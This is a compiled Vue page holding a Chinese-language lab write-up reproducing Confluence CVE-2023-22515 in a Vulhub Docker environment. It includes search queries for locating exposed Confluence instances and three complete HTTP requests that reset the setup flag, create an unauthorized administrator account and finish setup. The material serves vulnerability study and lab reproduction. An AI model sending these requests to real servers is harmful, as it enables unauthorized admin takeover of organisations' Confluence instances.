import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c,a as e,b as n,d as a,e as t}from"./app-58e4a7d6.js";const d={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Atlassian Confluence是企业广泛使用的wiki系统。",-1),v=e("p",null,[n("2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用 "),e("code",null,"/server-info.action"),n(" 端点传递 "),e("code",null,"bootstrapStatusProvider.applicationConfig.setupComplete"),n(" 参数，使服务器处于安装未完成状态，以访问受限制的端点并创建未经授权的 Confluence 管理员帐户，登录 Confluence 实例后台。")],-1),p=e("p",null,"该漏洞不影响8.0.0以前的版本。",-1),m=e("p",null,"参考链接：",-1),b={href:"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html",target:"_blank",rel:"noopener noreferrer"},h={href:"https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis",target:"_blank",rel:"noopener noreferrer"},g=t(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ATLASSIAN-Confluence&quot;
title==&quot;登录 - Confluence&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个Confluence Server 8.5.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,5),f=e("code",null,"http://your-ip:8090",-1),_={href:"https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396",target:"_blank",rel:"noopener noreferrer"},x=e("code",null,"db",-1),C=e("code",null,"confluence",-1),k=e("code",null,"postgres",-1),A=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231018183534534.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先，最主要的请求就是覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后，你就可以使用如下请求创建一个新的管理员账户<code>vulhub</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /setup/setupadministrator.action HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
X-Atlassian-Token: no-check

username=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送如下请求完成安装步骤：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /setup/finishsetup.action HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
X-Atlassian-Token: no-check
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后，直接使用新的<code>vulhub</code>账户（密码同样是<code>vulhub</code>）来登录Confluence，可见新的管理员已成功增加：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231018183608388.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10);function T(S,w){const i=s("ExternalLinkIcon");return o(),c("div",null,[r,u,v,p,m,e("ul",null,[e("li",null,[e("a",b,[n("https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html"),a(i)])]),e("li",null,[e("a",h,[n("https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis"),a(i)])])]),g,e("p",null,[n("环境启动后，访问"),f,n("即可进入安装向导，参考"),e("a",_,[n("CVE-2019-3396"),a(i)]),n("这个环境中的安装方法，申请试用版许可证。在填写数据库信息的页面，PostgreSQL数据库地址为"),x,n("，数据库名称"),C,n("，用户名密码均为"),k,n("。")]),A])}const y=l(d,[["render",T],["__file","Atlassian Confluence server-info.action 属性覆盖导致权限绕过漏洞 CVE-2023-22515.html.vue"]]);export{y as default};
